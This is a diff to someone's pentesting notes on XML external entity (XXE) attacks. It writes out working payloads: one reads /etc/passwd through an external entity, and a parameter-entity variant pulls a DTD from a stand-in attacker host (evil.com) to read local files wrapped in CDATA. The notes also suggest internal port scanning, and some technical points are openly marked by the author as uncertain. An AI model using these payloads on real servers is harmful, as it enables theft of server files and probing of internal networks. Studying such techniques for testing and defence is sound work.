@@ -792,16 +792,13 @@ http://www.vsecurity.com/download/publications/XMLDTDEntityAttacks.pdf
 [+] SUMMARY OF OWASP TALK - Stealing data using XXE (From 2013 - check OWASP if anything's changed):
 https://www.youtube.com/watch?v=eHSNT8vWLfc
 (CTRL+F "(EXPLOIT) PARTS IF IN A HURRY. The rest is for better understanding.)
+ONE MORE THING - it's really really easy to mess these hacks up, so make sure to test them out on a VM first (like Web For Pentester)
+Also try to use the same parser you'll be exploiting, since different parsers may behave differently. (for example, I wasn't able to get back PHP code from PHP's simpleXML parser, even when I inputted the CDATA and PHP code by hand (when it printed simplexml_load_string as a string (probably not the implementation you'll see in the wild). Even though Python worked. Also, <name><![CDATA[<name1>BradChad</name>]]></name> still outputted only BradChad, so this was the fault of the parser.)
 
 (*)(EXPLOIT)You can do it without pulling some tricks (With limitations). This allows you to steal things like /etc/passwd
 If you do:
 
-<!DOCTYPE updateProfile [
-	<!ENTITY stolenFile SYSTEM "file:///C:/Windows/win.ini">
-]]>    //I think there should only be one closing bracket here? When I tested on Web For Pentester, then it worked with 1 bracket.
-<updateProfile>
-	<name>&stolenFile<name>
-</updateProfile>
+<!DOCTYPE test [<!ENTITY x SYSTEM "file:///etc/passwd">]><name>&x;</name>
 
 Then there are some heavy restrictions:
 1) The data is stored server-side in the <name> field, and you need to be able to see it client-side to get the data.
@@ -826,25 +823,26 @@ Then there are some heavy restrictions:
 surround any include in CDATA tags, which means to interpret it as raw text.
 
 (the exploit) However, you CAN do it with parameter entities!
+
 <!DOCTYPE updateProfile [
 	//first we make the parameter entities
 	<!ENTITY % start "<![CDATA[">
-	<!ENTITY % file SYSTEM "file://c:/has/broken/xml">
+	<!ENTITY % file SYSTEM "file://c:/has/broken/xml">   //I think a third '/' is necessary after 'file:'? 
 	<!ENTITY % end "]]>">
 	//Then we grab a DTD file from our own website (necessary)
 	<!ENTITY % dtd SYSTEM "http://evil.com/join.dtd">
  	//By writing it out we are effectively executing the parameter entity as an entity
  	%dtd;
-]]>  //Only one closing bracket?
+]>
  
 //This is the join.dtd on our website
 <!ENTITY all "%start;%file;%end">
 
 //This is the field
-<name>&all</name>
+<name>&all;</name>
 
 This allows you to read well-formed xml documents (you can probably also use this to port scan internal services by doing http:// instead of file://). Still some restrictions:
-	1) Needs well-formed XML document   //I'm not sure if this is true.
+	1) Needs well-formed XML document   //Not sure if this is true.
 	2) No binary
 	3) Still requires that you get that data back somehow (for example by viewing your profile)
 
